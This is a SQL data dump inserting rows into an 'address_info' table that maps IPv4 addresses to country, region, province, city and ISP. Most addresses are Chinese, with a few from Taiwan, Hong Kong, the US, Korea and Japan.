INSERT INTO `address_info` VALUES ('123.125.143.12', '中国', '华北', '北京市', '北京市', '联通');
INSERT INTO `address_info` VALUES ('123.125.143.142', '中国', '华北', '北京市', '北京市', '联通');
INSERT INTO `address_info` VALUES ('123.125.71.49', '中国', '华北', '北京市', '北京市', '联通');
INSERT INTO `address_info` VALUES ('123.129.19.148', '中国', '华东', '山东省', '东营市', '联通');
INSERT INTO `address_info` VALUES ('123.13.206.59', '中国', '华中', '河南省', '许昌市', '联通');
INSERT INTO `address_info` VALUES ('123.131.41.124', '中国', '华东', '山东省', '潍坊市', '联通');
INSERT INTO `address_info` VALUES ('123.14.70.20', '中国', '华中', '河南省', '郑州市', '联通');
INSERT INTO `address_info` VALUES ('123.151.138.57', '中国', '华北', '天津市', '天津市', '电信');
INSERT INTO `address_info` VALUES ('123.151.153.35', '中国', '华北', '天津市', '天津市', '电信');
INSERT INTO `address_info` VALUES ('123.161.18.35', '中国', '华中', '河南省', '安阳市', '电信');
INSERT INTO `address_info` VALUES ('123.161.193.46', '中国', '华中', '河南省', '郑州市', '电信');
INSERT INTO `address_info` VALUES ('123.184.217.210', '中国', '东北', '辽宁省', '沈阳市', '电信');
INSERT INTO `address_info` VALUES ('123.195.142.247', null, null, null, null, null);
INSERT INTO `address_info` VALUES ('123.56.236.157', '中国', '华北', '北京市', '北京市', '阿里云');
INSERT INTO `address_info` VALUES ('123.7.39.40', '中国', '华中', '河南省', '许昌市', '联通');
INSERT INTO `address_info` VALUES ('123.7.77.206', '中国', '华中', '河南省', '平顶山市', '联通');
INSERT INTO `address_info` VALUES ('124.117.223.126', '中国', '西北', '新疆维吾尔自治区', '乌鲁木齐市', '电信');
INSERT INTO `address_info` VALUES ('124.133.178.70', '中国', '华东', '山东省', '济南市', '联通');
INSERT INTO `address_info` VALUES ('124.152.184.220', '中国', '西北', '甘肃省', '庆阳市', '联通');
INSERT INTO `address_info` VALUES ('124.204.33.82', '中国', '华北', '北京市', '北京市', '鹏博士');
INSERT INTO `address_info` VALUES ('124.205.59.98', '中国', '华北', '北京市', '北京市', '鹏博士');
INSERT INTO `address_info` VALUES ('124.238.60.243', '中国', '华北', '河北省', '沧州市', '电信');
INSERT INTO `address_info` VALUES ('124.239.251.32', '中国', '华北', '河北省', '廊坊市', '电信');
INSERT INTO `address_info` VALUES ('124.239.251.68', '中国', '华北', '河北省', '廊坊市', '电信');
INSERT INTO `address_info` VALUES ('124.239.87.199', '中国', '华北', '河北省', '邢台市', '电信');
INSERT INTO `address_info` VALUES ('124.72.154.236', '中国', '华东', '福建省', '泉州市', '电信');
INSERT INTO `address_info` VALUES ('124.79.164.146', '中国', '华东', '上海市', '上海市', '电信');
INSERT INTO `address_info` VALUES ('125.230.102.213', '台湾', '', '台湾省', '', '中华电信');
INSERT INTO `address_info` VALUES ('125.231.84.175', '台湾', '', '台湾省', '', '中华电信');
INSERT INTO `address_info` VALUES ('125.47.141.34', '中国', '华中', '河南省', '平顶山市', '联通');
INSERT INTO `address_info` VALUES ('125.69.47.187', '中国', '西南', '四川省', '成都市', '电信');
INSERT INTO `address_info` VALUES ('125.70.0.228', '中国', '西南', '四川省', '成都市', '电信');
INSERT INTO `address_info` VALUES ('125.70.116.179', '中国', '西南', '四川省', '成都市', '电信');
INSERT INTO `address_info` VALUES ('125.70.204.238', '中国', '西南', '四川省', '成都市', '电信');
INSERT INTO `address_info` VALUES ('125.71.113.163', '中国', '西南', '四川省', '成都市', '电信');
INSERT INTO `address_info` VALUES ('125.71.39.97', '中国', '西南', '四川省', '成都市', '电信');
INSERT INTO `address_info` VALUES ('125.71.54.227', '中国', '西南', '四川省', '成都市', '电信');
INSERT INTO `address_info` VALUES ('125.71.99.243', '中国', '西南', '四川省', '成都市', '电信');
INSERT INTO `address_info` VALUES ('125.77.31.71', '中国', '华东', '福建省', '福州市', '电信');
INSERT INTO `address_info` VALUES ('125.95.75.252', '中国', '华南', '广东省', '佛山市', '电信');
INSERT INTO `address_info` VALUES ('127.0.0.1', '未分配或者内网IP', '', '', '', '');
INSERT INTO `address_info` VALUES ('131.253.27.38', '美国', '', '', '', '');
INSERT INTO `address_info` VALUES ('138.197.71.243', '美国', '', '', '', '');
INSERT INTO `address_info` VALUES ('14.106.99.33', '中国', '西南', '重庆市', '重庆市', '电信');
INSERT INTO `address_info` VALUES ('14.116.140.13', '中国', '华南', '广东省', '广州市', '电信');
INSERT INTO `address_info` VALUES ('14.120.116.26', '中国', '华南', '广东省', '东莞市', '电信');
INSERT INTO `address_info` VALUES ('14.152.69.107', '中国', '华南', '广东省', '广州市', '电信');
INSERT INTO `address_info` VALUES ('14.152.69.196', '中国', '华南', '广东省', '广州市', '电信');
INSERT INTO `address_info` VALUES ('14.152.69.75', '中国', '华南', '广东省', '广州市', '电信');
INSERT INTO `address_info` VALUES ('14.63.225.46', '韩国', '', '', '', '');
INSERT INTO `address_info` VALUES ('140.206.32.38', '中国', '华东', '上海市', '上海市', '联通');
INSERT INTO `address_info` VALUES ('140.207.128.193', '中国', '华东', '上海市', '上海市', '联通');
INSERT INTO `address_info` VALUES ('140.240.18.126', '中国', '华南', '海南省', '省直辖县级行政区划', '电信');
INSERT INTO `address_info` VALUES ('144.48.4.115', '香港', '', '香港特别行政区', '', '');
INSERT INTO `address_info` VALUES ('157.119.71.195', '香港', '', '香港特别行政区', '', '');
INSERT INTO `address_info` VALUES ('171.113.100.211', '中国', '华中', '湖北省', '武汉市', '电信');
INSERT INTO `address_info` VALUES ('171.113.101.39', '中国', '华中', '湖北省', '武汉市', '电信');
INSERT INTO `address_info` VALUES ('171.113.115.46', '中国', '华中', '湖北省', '武汉市', '电信');
INSERT INTO `address_info` VALUES ('171.212.133.168', '中国', '西南', '四川省', '成都市', '电信');
INSERT INTO `address_info` VALUES ('171.214.200.215', '中国', '西南', '四川省', '成都市', '电信');
INSERT INTO `address_info` VALUES ('171.217.145.121', '中国', '西南', '四川省', '成都市', '电信');
INSERT INTO `address_info` VALUES ('171.221.36.193', '中国', '西南', '四川省', '成都市', '电信');
INSERT INTO `address_info` VALUES ('171.8.73.11', '中国', '华中', '河南省', '郑州市', '电信');
INSERT INTO `address_info` VALUES ('171.8.75.120', '中国', '华中', '河南省', '郑州市', '电信');
INSERT INTO `address_info` VALUES ('175.10.24.99', '中国', '华中', '湖南省', '长沙市', '电信');
INSERT INTO `address_info` VALUES ('175.30.216.133', '中国', '东北', '吉林省', '延边朝鲜族自治州', '电信');
INSERT INTO `address_info` VALUES ('175.30.216.174', '中国', '东北', '吉林省', '延边朝鲜族自治州', '电信');
INSERT INTO `address_info` VALUES ('175.30.217.203', '中国', '东北', '吉林省', '延边朝鲜族自治州', '电信');
INSERT INTO `address_info` VALUES ('175.30.219.171', '中国', '东北', '吉林省', '延边朝鲜族自治州', '电信');
INSERT INTO `address_info` VALUES ('175.30.219.254', '中国', '东北', '吉林省', '延边朝鲜族自治州', '电信');
INSERT INTO `address_info` VALUES ('180.107.201.134', '中国', '华东', '江苏省', '苏州市', '电信');
INSERT INTO `address_info` VALUES ('180.109.201.37', '中国', '华东', '江苏省', '南京市', '电信');
INSERT INTO `address_info` VALUES ('180.109.27.232', '中国', '华东', '江苏省', '南京市', '电信');
INSERT INTO `address_info` VALUES ('180.111.117.85', '中国', '华东', '江苏省', '南京市', '电信');
INSERT INTO `address_info` VALUES ('180.111.156.236', '中国', '华东', '江苏省', '南京市', '电信');
INSERT INTO `address_info` VALUES ('180.115.233.134', '中国', '华东', '江苏省', '常州市', '电信');
INSERT INTO `address_info` VALUES ('180.117.232.107', '中国', '华东', '江苏省', '苏州市', '电信');
INSERT INTO `address_info` VALUES ('180.119.102.189', '中国', '华东', '江苏省', '扬州市', '电信');
INSERT INTO `address_info` VALUES ('180.120.21.134', '中国', '华东', '江苏省', '南通市', '电信');
INSERT INTO `address_info` VALUES ('180.126.96.62', '中国', '华东', '江苏省', '盐城市', '电信');
INSERT INTO `address_info` VALUES ('180.153.160.61', '中国', '华东', '上海市', '上海市', '电信');
INSERT INTO `address_info` VALUES ('180.163.1.46', '中国', '华东', '上海市', '上海市', '电信');
INSERT INTO `address_info` VALUES ('180.163.2.88', '中国', '华东', '上海市', '上海市', '电信');
INSERT INTO `address_info` VALUES ('180.173.234.46', '中国', '华东', '上海市', '上海市', '电信');
INSERT INTO `address_info` VALUES ('180.175.86.121', '中国', '华东', '上海市', '上海市', '电信');
INSERT INTO `address_info` VALUES ('180.97.237.22', null, null, null, null, null);
INSERT INTO `address_info` VALUES ('180.97.238.169', '中国', '华东', '江苏省', '苏州市', '电信');
INSERT INTO `address_info` VALUES ('180.99.47.103', '中国', '华东', '江苏省', '南京市', '电信');
INSERT INTO `address_info` VALUES ('182.110.133.137', '中国', '华东', '江西省', '宜春市', '电信');
INSERT INTO `address_info` VALUES ('182.130.213.117', '中国', '西南', '四川省', '泸州市', '电信');
INSERT INTO `address_info` VALUES ('182.149.161.240', '中国', '西南', '四川省', '成都市', '电信');
INSERT INTO `address_info` VALUES ('182.149.188.85', '中国', '西南', '四川省', '成都市', '电信');
INSERT INTO `address_info` VALUES ('182.149.202.194', '中国', '西南', '四川省', '成都市', '电信');
INSERT INTO `address_info` VALUES ('182.151.203.19', '中国', '西南', '四川省', '成都市', '电信');
INSERT INTO `address_info` VALUES ('182.18.23.7', '中国', '华北', '北京市', '北京市', '联通');
INSERT INTO `address_info` VALUES ('182.90.34.71', '中国', '华南', '广西壮族自治区', '梧州市', '联通');
INSERT INTO `address_info` VALUES ('183.11.36.205', '中国', '华南', '广东省', '深圳市', '电信');
INSERT INTO `address_info` VALUES ('183.13.200.10', '中国', '华南', '广东省', '深圳市', '电信');
INSERT INTO `address_info` VALUES ('183.13.200.134', '中国', '华南', '广东省', '深圳市', '电信');
INSERT INTO `address_info` VALUES ('183.13.201.126', '中国', '华南', '广东省', '深圳市', '电信');
INSERT INTO `address_info` VALUES ('183.13.201.54', '中国', '华南', '广东省', '深圳市', '电信');
INSERT INTO `address_info` VALUES ('183.13.201.72', '中国', '华南', '广东省', '深圳市', '电信');
INSERT INTO `address_info` VALUES ('183.13.202.17', '中国', '华南', '广东省', '深圳市', '电信');
INSERT INTO `address_info` VALUES ('183.13.202.187', '中国', '华南', '广东省', '深圳市', '电信');
INSERT INTO `address_info` VALUES ('183.13.202.247', '中国', '华南', '广东省', '深圳市', '电信');
INSERT INTO `address_info` VALUES ('183.13.207.147', '中国', '华南', '广东省', '深圳市', '电信');
INSERT INTO `address_info` VALUES ('183.13.207.3', '中国', '华南', '广东省', '深圳市', '电信');
INSERT INTO `address_info` VALUES ('183.131.161.162', '中国', '华东', '浙江省', '湖州市', '电信');
INSERT INTO `address_info` VALUES ('183.131.67.243', '中国', '华东', '浙江省', '金华市', '电信');
INSERT INTO `address_info` VALUES ('183.14.28.16', '中国', '华南', '广东省', '深圳市', '电信');
INSERT INTO `address_info` VALUES ('183.154.134.109', '中国', '华东', '浙江省', '金华市', '电信');
INSERT INTO `address_info` VALUES ('183.154.44.207', '中国', '华东', '浙江省', '金华市', '电信');
INSERT INTO `address_info` VALUES ('183.155.249.99', '中国', '华东', '浙江省', '金华市', '电信');
INSERT INTO `address_info` VALUES ('183.156.76.244', '中国', '华东', '浙江省', '杭州市', '电信');
INSERT INTO `address_info` VALUES ('183.156.8.234', '中国', '华东', '浙江省', '杭州市', '电信');
INSERT INTO `address_info` VALUES ('183.158.77.71', '中国', '华东', '浙江省', '杭州市', '电信');
INSERT INTO `address_info` VALUES ('183.167.2.144', '中国', '华东', '安徽省', '铜陵市', '电信');
INSERT INTO `address_info` VALUES ('183.17.52.252', '中国', '华南', '广东省', '深圳市', '电信');
INSERT INTO `address_info` VALUES ('183.186.118.103', '中国', '华北', '山西省', '吕梁市', '联通');
INSERT INTO `address_info` VALUES ('183.198.254.98', '中国', '华北', '河北省', '保定市', '移动');
INSERT INTO `address_info` VALUES ('183.204.68.2', '中国', '华中', '河南省', '郑州市', '移动');
INSERT INTO `address_info` VALUES ('183.205.146.28', '中国', '华中', '河南省', '平顶山市', '移动');
INSERT INTO `address_info` VALUES ('183.209.233.251', '中国', '华东', '江苏省', '苏州市', '移动');
INSERT INTO `address_info` VALUES ('183.22.29.66', '中国', '华南', '广东省', '东莞市', '电信');
INSERT INTO `address_info` VALUES ('183.222.249.82', '中国', '西南', '四川省', '达州市', '移动');
INSERT INTO `address_info` VALUES ('183.228.0.198', '中国', '西南', '重庆市', '重庆市', '移动');
INSERT INTO `address_info` VALUES ('183.238.185.202', '中国', '华南', '广东省', '深圳市', '移动');
INSERT INTO `address_info` VALUES ('183.240.196.48', '中国', '华南', '广东省', '深圳市', '移动');
INSERT INTO `address_info` VALUES ('183.240.196.58', '中国', '华南', '广东省', '深圳市', '移动');
INSERT INTO `address_info` VALUES ('183.240.196.60', '中国', '华南', '广东省', '深圳市', '移动');
INSERT INTO `address_info` VALUES ('183.240.20.28', '中国', '华南', '广东省', '广州市', '移动');
INSERT INTO `address_info` VALUES ('183.240.202.26', '中国', '华南', '广东省', '深圳市', '移动');
INSERT INTO `address_info` VALUES ('183.246.204.149', '中国', '华东', '浙江省', '湖州市', '移动');
INSERT INTO `address_info` VALUES ('183.247.163.80', null, null, null, null, null);
INSERT INTO `address_info` VALUES ('183.27.62.99', '中国', '华南', '广东省', '佛山市', '电信');
INSERT INTO `address_info` VALUES ('183.38.249.178', '中国', '华南', '广东省', '深圳市', '电信');
INSERT INTO `address_info` VALUES ('183.39.154.235', '中国', '华南', '广东省', '深圳市', '电信');
INSERT INTO `address_info` VALUES ('183.48.46.215', '中国', '华南', '广东省', '广州市', '电信');
INSERT INTO `address_info` VALUES ('183.48.70.60', '中国', '华南', '广东省', '广州市', '电信');
INSERT INTO `address_info` VALUES ('183.61.51.54', '中国', '华南', '广东省', '深圳市', '电信');
INSERT INTO `address_info` VALUES ('183.63.207.16', null, null, null, null, null);
INSERT INTO `address_info` VALUES ('183.93.99.229', '中国', '华中', '湖北省', '荆州市', '联通');
INSERT INTO `address_info` VALUES ('198.244.49.17', '美国', '', '', '', '');
INSERT INTO `address_info` VALUES ('202.104.137.50', '中国', '华南', '广东省', '深圳市', '电信');
INSERT INTO `address_info` VALUES ('202.239.38.162', '日本', '', '', '', '');
INSERT INTO `address_info` VALUES ('210.12.122.71', null, null, null, null, null);
INSERT INTO `address_info` VALUES ('210.21.62.143', '中国', '华南', '广东省', '广州市', '联通');
INSERT INTO `address_info` VALUES ('211.100.57.203', '中国', '华北', '北京市', '北京市', '电信');
INSERT INTO `address_info` VALUES ('211.149.212.77', '中国', '西南', '四川省', '', '电信');
INSERT INTO `address_info` VALUES ('218.108.158.84', '中国', '华东', '浙江省', '杭州市', '华数传媒');
INSERT INTO `address_info` VALUES ('218.161.119.116', '台湾', '', '台湾省', '', '中华电信');
INSERT INTO `address_info` VALUES ('218.17.34.50', '中国', '华南', '广东省', '深圳市', '电信');
INSERT INTO `address_info` VALUES ('218.18.146.64', '中国', '华南', '广东省', '深圳市', '电信');
INSERT INTO `address_info` VALUES ('218.201.180.12', '中国', '华东', '山东省', '泰安市', '移动');
INSERT INTO `address_info` VALUES ('218.247.9.133', null, null, null, null, null);
INSERT INTO `address_info` VALUES ('218.28.177.109', '中国', '华中', '河南省', '郑州市', '联通');
INSERT INTO `address_info` VALUES ('218.28.21.122', '中国', '华中', '河南省', '郑州市', '联通');
INSERT INTO `address_info` VALUES ('218.28.253.82', '中国', '华中', '河南省', '郑州市', '联通');
INSERT INTO `address_info` VALUES ('218.29.101.202', '中国', '华中', '河南省', '郑州市', '联通');
INSERT INTO `address_info` VALUES ('218.29.68.130', '中国', '华中', '河南省', '郑州市', '联通');
INSERT INTO `address_info` VALUES ('218.68.233.173', '中国', '华北', '天津市', '天津市', '联通');
INSERT INTO `address_info` VALUES ('218.72.24.57', '中国', '华东', '浙江省', '杭州市', '电信');
INSERT INTO `address_info` VALUES ('218.76.35.70', '中国', '华中', '湖南省', '长沙市', '电信');
INSERT INTO `address_info` VALUES ('218.77.94.74', '中国', '华中', '湖南省', '益阳市', '电信');
INSERT INTO `address_info` VALUES ('218.88.95.57', '中国', '西南', '四川省', '成都市', '电信');
INSERT INTO `address_info` VALUES ('219.133.233.237', '中国', '华南', '广东省', '深圳市', '电信');
INSERT INTO `address_info` VALUES ('219.134.114.201', '中国', '华南', '广东省', '深圳市', '电信');
INSERT INTO `address_info` VALUES ('219.137.140.4', '中国', '华南', '广东省', '广州市', '电信');
INSERT INTO `address_info` VALUES ('219.137.142.192', '中国', '华南', '广东省', '广州市', '电信');
INSERT INTO `address_info` VALUES ('219.137.142.4', '中国', '华南', '广东省', '广州市', '电信');
INSERT INTO `address_info` VALUES ('219.137.143.0', '中国', '华南', '广东省', '广州市', '电信');
INSERT INTO `address_info` VALUES ('219.137.143.238', '中国', '华南', '广东省', '广州市', '电信');
INSERT INTO `address_info` VALUES ('219.137.183.195', '中国', '华南', '广东省', '广州市', '电信');
INSERT INTO `address_info` VALUES ('219.139.72.73', '中国', '华中', '湖北省', '孝感市', '电信');
INSERT INTO `address_info` VALUES ('219.141.166.54', '中国', '华北', '北京市', '北京市', '电信');
INSERT INTO `address_info` VALUES ('219.143.176.170', '中国', '华北', '北京市', '北京市', '电信');
INSERT INTO `address_info` VALUES ('219.143.89.175', null, null, null, null, null);
INSERT INTO `address_info` VALUES ('219.156.67.174', '中国', '华中', '河南省', '郑州市', '联通');
INSERT INTO `address_info` VALUES ('219.159.109.179', '中国', '华南', '广西壮族自治区', '桂林市', '电信');
INSERT INTO `address_info` VALUES ('219.82.240.90', '中国', '华东', '浙江省', '杭州市', '华数传媒');
INSERT INTO `address_info` VALUES ('220.132.210.186', '台湾', '', '台湾省', '', '中华电信');
INSERT INTO `address_info` VALUES ('220.133.43.5', '台湾', '', '台湾省', '', '中华电信');
INSERT INTO `address_info` VALUES ('220.160.77.208', '中国', '华东', '福建省', '福州市', '电信');
INSERT INTO `address_info` VALUES ('220.164.237.103', '中国', '西南', '云南省', '德宏傣族景颇族自治州', '电信');
INSERT INTO `address_info` VALUES ('220.166.208.161', '中国', '西南', '四川省', '成都市', '电信');
INSERT INTO `address_info` VALUES ('220.178.5.102', '中国', '华东', '安徽省', '合肥市', '电信');
INSERT INTO `address_info` VALUES ('220.181.108.158', '中国', '华北', '北京市', '北京市', '电信');
INSERT INTO `address_info` VALUES ('220.181.57.217', '中国', '华北', '北京市', '北京市', '电信');
INSERT INTO `address_info` VALUES ('220.191.255.193', '中国', '华东', '浙江省', '丽水市', '电信');
INSERT INTO `address_info` VALUES ('220.200.43.172', '中国', '华东', '福建省', '福州市', '联通');
INSERT INTO `address_info` VALUES ('221.10.28.217', '中国', '西南', '四川省', '成都市', '联通');
INSERT INTO `address_info` VALUES ('221.10.28.218', '中国', '西南', '四川省', '成都市', '联通');
INSERT INTO `address_info` VALUES ('221.10.28.219', '中国', '西南', '四川省', '成都市', '联通');
INSERT INTO `address_info` VALUES ('221.122.114.234', '中国', '华北', '北京市', '北京市', '联通');
INSERT INTO `address_info` VALUES ('221.216.50.185', '中国', '华北', '北京市', '北京市', '联通');
INSERT INTO `address_info` VALUES ('221.217.120.16', '中国', '华北', '北京市', '北京市', '联通');
INSERT INTO `address_info` VALUES ('221.232.175.127', '中国', '华中', '湖北省', '武汉市', '电信');
INSERT INTO `address_info` VALUES ('221.234.135.188', '中国', '华中', '湖北省', '武汉市', '电信');
INSERT INTO `address_info` VALUES ('221.234.199.168', '中国', '华中', '湖北省', '武汉市', '电信');
INSERT INTO `address_info` VALUES ('221.237.112.114', '中国', '西南', '四川省', '成都市', '电信');
INSERT INTO `address_info` VALUES ('221.237.196.155', '中国', '西南', '四川省', '泸州市', '电信');
INSERT INTO `address_info` VALUES ('221.237.196.203', '中国', '西南', '四川省', '泸州市', '电信');
INSERT INTO `address_info` VALUES ('221.237.197.116', '中国', '西南', '四川省', '泸州市', '电信');
INSERT INTO `address_info` VALUES ('221.237.197.118', '中国', '西南', '四川省', '泸州市', '电信');
INSERT INTO `address_info` VALUES ('222.136.193.230', '中国', '华中', '河南省', '平顶山市', '联通');
INSERT INTO `address_info` VALUES ('222.177.27.253', '中国', '西南', '重庆市', '重庆市', '电信');
INSERT INTO `address_info` VALUES ('222.208.85.212', '中国', '西南', '四川省', '泸州市', '电信');
INSERT INTO `address_info` VALUES ('222.208.88.192', '中国', '西南', '四川省', '泸州市', '电信');
INSERT INTO `address_info` VALUES ('222.208.88.50', '中国', '西南', '四川省', '泸州市', '电信');
INSERT INTO `address_info` VALUES ('222.208.89.122', '中国', '西南', '四川省', '泸州市', '电信');
INSERT INTO `address_info` VALUES ('222.209.92.171', '中国', '西南', '四川省', '成都市', '电信');
INSERT INTO `address_info` VALUES ('222.222.43.204', '中国', '华北', '河北省', '石家庄市', '电信');
INSERT INTO `address_info` VALUES ('222.247.54.124', '中国', '华中', '湖南省', '长沙市', '电信');
INSERT INTO `address_info` VALUES ('222.66.159.28', '中国', '华东', '上海市', '上海市', '电信');
INSERT INTO `address_info` VALUES ('223.104.63.217', '中国', '华南', '广东省', '东莞市', '移动');
INSERT INTO `address_info` VALUES ('223.11.0.203', '中国', '华北', '山西省', '太原市', '电信');
INSERT INTO `address_info` VALUES ('223.141.191.174', '台湾', '', '台湾省', '', '中华电信');
INSERT INTO `address_info` VALUES ('223.156.158.89', '中国', '华中', '湖南省', '湘潭市', '电信');
INSERT INTO `address_info` VALUES ('223.166.198.20', '中国', '华东', '上海市', '上海市', '联通');
INSERT INTO `address_info` VALUES ('223.214.221.207', '中国', '华东', '安徽省', '合肥市', '电信');
INSERT INTO `address_info` VALUES ('223.71.139.17', '中国', '华北', '北京市', '北京市', '移动');
INSERT INTO `address_info` VALUES ('223.72.178.218', '中国', '华北', '北京市', '北京市', '移动');
INSERT INTO `address_info` VALUES ('223.73.209.177', '中国', '华南', '广东省', '深圳市', '移动');
INSERT INTO `address_info` VALUES ('223.73.38.248', '中国', '华南', '广东省', '惠州市', '移动');
INSERT INTO `address_info` VALUES ('223.74.181.140', '中国', '华南', '广东省', '东莞市', '移动');
INSERT INTO `address_info` VALUES ('223.74.181.84', '中国', '华南', '广东省', '东莞市', '移动');
INSERT INTO `address_info` VALUES ('223.74.229.129', '中国', '华南', '广东省', '揭阳市', '移动');
INSERT INTO `address_info` VALUES ('223.74.241.142', '中国', '华南', '广东省', '揭阳市', '移动');
INSERT INTO `address_info` VALUES ('27.102.70.194', '韩国', '', '', '', '');
INSERT INTO `address_info` VALUES ('27.154.54.186', '中国', '华东', '福建省', '厦门市', '电信');
INSERT INTO `address_info` VALUES ('27.16.216.79', '中国', '华中', '湖北省', '武汉市', '电信');
INSERT INTO `address_info` VALUES ('27.17.135.108', '中国', '华中', '湖北省', '武汉市', '电信');
INSERT INTO `address_info` VALUES ('27.17.56.186', '中国', '华中', '湖北省', '武汉市', '电信');
INSERT INTO `address_info` VALUES ('27.187.94.143', '中国', '华北', '河北省', '保定市', '电信');
INSERT INTO `address_info` VALUES ('27.188.235.63', '中国', '华北', '河北省', '邯郸市', '电信');
INSERT INTO `address_info` VALUES ('27.188.238.94', '中国', '华北', '河北省', '邯郸市', '电信');
INSERT INTO `address_info` VALUES ('27.19.157.192', '中国', '华中', '湖北省', '武汉市', '电信');
INSERT INTO `address_info` VALUES ('27.19.179.190', '中国', '华中', '湖北省', '武汉市', '电信');
INSERT INTO `address_info` VALUES ('27.27.230.58', '中国', '华中', '湖北省', '襄樊市', '电信');
INSERT INTO `address_info` VALUES ('36.102.208.33', '中国', '华北', '内蒙古自治区', '', '电信');
INSERT INTO `address_info` VALUES ('36.102.210.236', '中国', '华北', '内蒙古自治区', '', '电信');
INSERT INTO `address_info` VALUES ('36.102.210.250', '中国', '华北', '内蒙古自治区', '', '电信');
INSERT INTO `address_info` VALUES ('36.162.194.59', '中国', '西南', '西藏自治区', '日喀则市', '移动');
INSERT INTO `address_info` VALUES ('36.224.63.114', '台湾', '', '台湾省', '', '中华电信');
INSERT INTO `address_info` VALUES ('36.226.11.252', '台湾', '', '台湾省', '', '中华电信');
INSERT INTO `address_info` VALUES ('36.229.11.235', '台湾', '', '台湾省', '', '中华电信');
INSERT INTO `address_info` VALUES ('36.229.200.159', '台湾', '', '台湾省', '', '中华电信');
INSERT INTO `address_info` VALUES ('36.237.54.95', '台湾', '', '台湾省', '', '中华电信');
INSERT INTO `address_info` VALUES ('36.4.157.249', '中国', '华东', '安徽省', '铜陵市', '电信');
INSERT INTO `address_info` VALUES ('36.49.73.172', '中国', '东北', '吉林省', '长春市', '电信');
INSERT INTO `address_info` VALUES ('39.128.152.232', '中国', '西南', '云南省', '文山壮族苗族自治州', '移动');
INSERT INTO `address_info` VALUES ('39.128.45.152', '中国', '西南', '云南省', '曲靖市', '移动');
INSERT INTO `address_info` VALUES ('39.128.81.112', '中国', '西南', '云南省', '玉溪市', '移动');
INSERT INTO `address_info` VALUES ('39.130.104.128', '中国', '西南', '云南省', '昆明市', '移动');
INSERT INTO `address_info` VALUES ('39.155.192.65', '中国', '华北', '北京市', '北京市', '移动');
INSERT INTO `address_info` VALUES ('39.64.92.151', '中国', '华东', '山东省', '济南市', '联通');
INSERT INTO `address_info` VALUES ('39.71.219.116', '中国', '华东', '山东省', '济南市', '联通');
INSERT INTO `address_info` VALUES ('39.73.163.248', '中国', '华东', '山东省', '烟台市', '联通');
INSERT INTO `address_info` VALUES ('40.77.179.65', '美国', '', '', '', '');
INSERT INTO `address_info` VALUES ('42.2.169.115', '香港', '', '香港特别行政区', '', 'pccw');
INSERT INTO `address_info` VALUES ('42.226.101.118', '中国', '华中', '河南省', '新乡市', '联通');
INSERT INTO `address_info` VALUES ('42.226.103.176', '中国', '华中', '河南省', '新乡市', '联通');
INSERT INTO `address_info` VALUES ('42.226.99.182', '中国', '华中', '河南省', '新乡市', '联通');
INSERT INTO `address_info` VALUES ('42.234.111.11', '中国', '华中', '河南省', '南阳市', '联通');
INSERT INTO `address_info` VALUES ('42.236.91.101', '中国', '华中', '河南省', '郑州市', '联通');
INSERT INTO `address_info` VALUES ('42.236.91.94', '中国', '华中', '河南省', '郑州市', '联通');
INSERT INTO `address_info` VALUES ('42.51.42.88', '中国', '华中', '河南省', '洛阳市', '联通');
INSERT INTO `address_info` VALUES ('42.90.248.140', '中国', '西北', '甘肃省', '兰州市', '电信');
INSERT INTO `address_info` VALUES ('42.94.11.247', '中国', '西北', '甘肃省', '兰州市', '电信');
INSERT INTO `address_info` VALUES ('43.248.76.252', '中国', '华东', '江苏省', '常州市', '电信');
INSERT INTO `address_info` VALUES ('43.251.37.13', '中国', '西北', '宁夏回族自治区', '中卫市', '联通');
INSERT INTO `address_info` VALUES ('45.249.95.18', '香港', '', '香港特别行政区', '', '');
INSERT INTO `address_info` VALUES ('47.52.46.25', '香港', '', '香港特别行政区', '', '阿里云');
INSERT INTO `address_info` VALUES ('49.118.198.145', '中国', '西北', '新疆维吾尔自治区', '乌鲁木齐市', '电信');
INSERT INTO `address_info` VALUES ('49.213.137.13', '台湾', '', '台湾省', '', '');
INSERT INTO `address_info` VALUES ('49.72.248.124', '中国', '华东', '江苏省', '苏州市', '电信');
INSERT INTO `address_info` VALUES ('49.80.225.141', '中国', '华东', '江苏省', '无锡市', '电信');
INSERT INTO `address_info` VALUES ('58.132.171.166', '中国', '华北', '北京市', '北京市', '联通');
INSERT INTO `address_info` VALUES ('58.16.5.126', '中国', '西南', '贵州省', '贵阳市', '联通');
INSERT INTO `address_info` VALUES ('58.17.70.27', '中国', '华东', '江西省', '宜春市', '联通');
INSERT INTO `address_info` VALUES ('58.211.116.198', '中国', '华东', '江苏省', '苏州市', '电信');
INSERT INTO `address_info` VALUES ('58.212.130.35', '中国', '华东', '江苏省', '南京市', '电信');
INSERT INTO `address_info` VALUES ('58.214.79.14', '中国', '华东', '江苏省', '无锡市', '电信');
INSERT INTO `address_info` VALUES ('58.215.8.2', '中国', '华东', '江苏省', '无锡市', '电信');
INSERT INTO `address_info` VALUES ('58.216.32.219', '中国', '华东', '江苏省', '常州市', '电信');
INSERT INTO `address_info` VALUES ('58.217.245.253', '中国', '华东', '江苏省', '南京市', '电信');
INSERT INTO `address_info` VALUES ('58.221.131.89', '中国', '华东', '江苏省', '南通市', '电信');
INSERT INTO `address_info` VALUES ('58.221.71.222', '中国', '华东', '江苏省', '南通市', '电信');
INSERT INTO `address_info` VALUES ('58.246.103.244', '中国', '华东', '上海市', '上海市', '联通');
INSERT INTO `address_info` VALUES ('58.246.121.116', '中国', '华东', '上海市', '上海市', '联通');
INSERT INTO `address_info` VALUES ('58.246.135.90', '中国', '华东', '上海市', '上海市', '联通');
INSERT INTO `address_info` VALUES ('58.49.116.194', '中国', '华中', '湖北省', '武汉市', '电信');
INSERT INTO `address_info` VALUES ('59.108.41.114', '中国', '华北', '北京市', '北京市', '方正网络');
INSERT INTO `address_info` VALUES ('59.174.4.156', '中国', '华中', '湖北省', '武汉市', '电信');
INSERT INTO `address_info` VALUES ('59.41.202.245', '中国', '华南', '广东省', '广州市', '电信');
INSERT INTO `address_info` VALUES ('59.41.202.28', '中国', '华南', '广东省', '广州市', '电信');
INSERT INTO `address_info` VALUES ('59.41.204.130', '中国', '华南', '广东省', '广州市', '电信');
INSERT INTO `address_info` VALUES ('59.41.204.145', '中国', '华南', '广东省', '广州市', '电信');
INSERT INTO `address_info` VALUES ('59.41.204.174', '中国', '华南', '广东省', '广州市', '电信');
INSERT INTO `address_info` VALUES ('59.41.205.196', '中国', '华南', '广东省', '广州市', '电信');
INSERT INTO `address_info` VALUES ('59.41.205.21', '中国', '华南', '广东省', '广州市', '电信');
